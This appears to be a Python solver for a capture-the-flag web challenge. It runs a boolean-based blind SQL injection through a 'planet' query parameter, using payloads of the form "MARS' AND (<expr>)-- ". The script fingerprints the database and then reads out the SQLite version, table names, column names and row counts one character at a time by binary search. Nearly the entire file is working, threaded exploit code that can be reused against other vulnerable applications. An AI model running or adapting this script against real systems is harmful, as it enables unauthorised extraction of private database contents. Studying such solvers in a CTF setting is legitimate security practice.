#!/usr/bin/env python
"""Planetary Probe recon: fingerprint the DB and read the schema through a 1-bit oracle.

Every probe is one `MARS' AND (<expr>)-- ` request, answered by the carrier/null lamp only,
so a value costs ~7 requests per character. Connections are kept alive and candidate name
lists are tried in parallel threads (one socket each) to keep the wall time sane.
"""
import http.client
import json
import ssl
import sys
import threading
import time
import urllib.parse

HOST = "planetary.web.2026.sunshinectf.games"
CTX = ssl.create_default_context()
CALL = [0]
_lock = threading.Lock()
_tl = threading.local()


def conn():
    c = getattr(_tl, "c", None)
    if c is None:
        c = http.client.HTTPSConnection(HOST, context=CTX, timeout=40)
        _tl.c = c
    return c


def raw(payload):
    path = "/probe?" + urllib.parse.urlencode({"planet": payload})
    for attempt in range(6):
        with _lock:
            CALL[0] += 1
        try:
            c = conn()
            c.request("GET", path, headers={"User-Agent": "probe", "Connection": "keep-alive"})
            r = c.getresponse()
            body = r.read().decode("latin-1")
            if r.status != 200:
                sys.stderr.write("\n  [status %s]\n" % r.status)
                time.sleep(1.0)
                continue
        except Exception as e:
            sys.stderr.write("\n  [reconnect %s]\n" % type(e).__name__)
            try:
                conn().close()
            except Exception:
                pass
            _tl.c = None
            time.sleep(0.6)
            continue
        if "readout--carrier" in body:
            return True
        if "readout--null" in body:
            return False
        sys.stderr.write("\n  [unrecognised page, %d bytes]\n" % len(body))
        time.sleep(0.6)
    raise RuntimeError("no usable answer for %r" % payload)


def cond(expr):
    return raw("MARS' AND (%s)-- " % expr)


def any_true(exprs, workers=6):
    """Return the first expression that evaluates true, trying them concurrently."""
    exprs = list(exprs)
    hit = []
    lock = threading.Lock()

    def work(batch):
        for e in batch:
            if hit:
                return
            try:
                if cond(e):
                    with lock:
                        if not hit:
                            hit.append(e)
                    return
            except Exception as ex:
                sys.stderr.write("\n  [probe failed: %s]\n" % ex)
    k = max(1, len(exprs) // workers + (1 if len(exprs) % workers else 0))
    ts = [threading.Thread(target=work, args=(exprs[i:i + k],)) for i in range(0, len(exprs), k)]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    return hit[0] if hit else None


def text(expr, maxlen=400, label=""):
    if cond("length(%s)>=%d" % (expr, maxlen)):
        print("[-] %s longer than %d" % (label or expr, maxlen))
        return None
    lo, hi = 0, maxlen - 1
    while lo < hi:
        mid = (lo + hi) // 2
        lo = mid + 1 if cond("length(%s)>%d" % (expr, mid)) else mid
    n = lo
    if not n:
        return ""
    sys.stdout.write("    %s len=%d: " % (label or expr, n))
    sys.stdout.flush()
    chars = []
    for pos in range(1, n + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            lo = mid + 1 if cond("ascii(substr((%s),%d,1))>%d" % (expr, pos, mid)) else mid
        chars.append(chr(lo))
        sys.stdout.write("\r    %-28s %3d/%-3d %s" % (label, pos, n, "".join(chars)))
        sys.stdout.flush()
    print("   [%d calls]" % CALL[0])
    return "".join(chars)


def count(expr, label=""):
    lo, hi = 0, 1 << 20
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond("(%s)>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    print("[*] %s = %d" % (label or expr, lo))
    return lo


def col_of(table):
    k = count("(SELECT COUNT(*) FROM pragma_table_info('%s'))" % table, "cols in " + table)
    return [text("(SELECT name FROM pragma_table_info('%s') LIMIT 1 OFFSET %d)" % (table, j),
                 label="%s.col%d" % (table, j)) for j in range(k)]


def schema():
    print("[*] fingerprint")
    print("    sqlite  ->", cond("(SELECT sqlite_version())>'3'"))
    print("    postgres->", cond("(SELECT current_database())>''"))
    if not cond("(SELECT sqlite_version())>'3'"):
        return
    print("[+] SQLite version:", text("(SELECT sqlite_version())", label="ver"))
    n = count("(SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%')", "user tables")
    tables = [text("(SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET %d)" % i,
                   label="table%d" % i) for i in range(n)]
    print("[*] tables:", tables)
    info = {}
    for t in tables:
        if not t:
            continue
        cols = col_of(t)
        rows = count("(SELECT COUNT(*) FROM %s)" % t, "rows in " + t)
        info[t] = {"columns": cols, "rows": rows}
        print("[+] %-16s rows=%-4d cols=%s" % (t, rows, cols))
    json.dump(info, open("analysis/schema.json", "w"), indent=1)
    return info


if __name__ == "__main__":
    schema()
